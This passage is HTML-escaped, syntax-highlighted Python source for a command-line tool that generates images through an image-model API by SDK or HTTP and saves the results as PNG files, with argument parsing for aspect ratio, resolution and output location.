&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;contents&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;prompt, image_part&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;contents&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; prompt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    try:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; client.models.generate_content&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;model&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;MODEL,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;contents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;contents,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;types.GenerateContentConfig&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nv&#34;&gt;image_config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;types.ImageConfig&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;nv&#34;&gt;aspectRatio&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;aspect_ratio,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;nv&#34;&gt;imageSize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;resolution,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    except Exception as exc:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;API Error: {exc}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;saved&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;ts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; datetime.now&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;.strftime&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Y%m%d_%H%M%S&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;output_dir&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; _resolve_output_dir&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_dir, mkdir&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;image_parts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; part in response.parts:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; part.text is not None:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Response text: {part.text}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; image :&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; part.as_image&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            image_parts.append&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;image&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; not image_parts:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;first&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;image_parts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; image_parts&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;:1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;last&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;image_parts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; image_parts&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-1:&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;max_res&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;image_parts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;max&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;image_parts, &lt;span class=&#34;nv&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;lambda x: len&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x.image_bytes&lt;span class=&#34;o&#34;&gt;))]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i, image in enumerate&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;image_parts&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; _build_filename&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_name, ts, i, &lt;span class=&#34;s2&#34;&gt;&amp;#34;.png&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Path&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;output_dir&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; / filename
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        image.save&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        saved.append&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; saved
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def _http_generate&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;prompt: str, output_dir: str, aspect_ratio: str, resolution: str, input_image: str &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; None,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                   &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;: str, output_name: str &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; None, mkdir: bool&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; -&amp;gt; list&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;str&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; input_image and not Path&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;input_image&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.exists&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Error: Input image not found: {input_image}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;s2&#34;&gt;&amp;#34;{API_BASE_URL.rstrip(&amp;#39;/&amp;#39;)}/v1beta/models/{MODEL}:generateContent&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;parts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt;: prompt&lt;span class=&#34;o&#34;&gt;}]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; input_image:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        parts.append&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_load_image_inline&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;input_image&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;contents&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;parts&amp;#34;&lt;/span&gt;: parts&lt;span class=&#34;o&#34;&gt;}]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;generationConfig&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;responseModalities&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;TEXT&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;IMAGE&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;imageConfig&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;aspectRatio&amp;#34;&lt;/span&gt;: aspect_ratio, &lt;span class=&#34;s2&#34;&gt;&amp;#34;imageSize&amp;#34;&lt;/span&gt;: resolution&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    try:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; _post_json&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;url, body&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    except Exception as exc:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;API Error: {exc}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;candidates&amp;#34;&lt;/span&gt; not in resp:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Unexpected response: {resp}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;parts_out&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; resp&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;candidates&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;parts&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; _save_images&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;parts_out, output_dir, &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;, output_name, mkdir&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;def main&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;parser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; argparse.ArgumentParser&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;description&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Generate images via SDK or HTTP&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    parser.add_argument&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;prompt&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;nargs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Image description prompt&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    parser.add_argument&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--mode&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sdk&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;choices&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sdk&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;http&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    parser.add_argument&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--aspect-ratio&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;-a&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;16:9&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;choices&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;VALID_ASPECT_RATIOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    parser.add_argument&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--resolution&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;-r&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;4K&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;choices&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;VALID_RESOLUTIONS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    parser.add_argument&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--output-dir&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;-o&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    parser.add_argument&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--output-name&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;None&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    parser.add_argument&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--mkdir&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;store_true&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
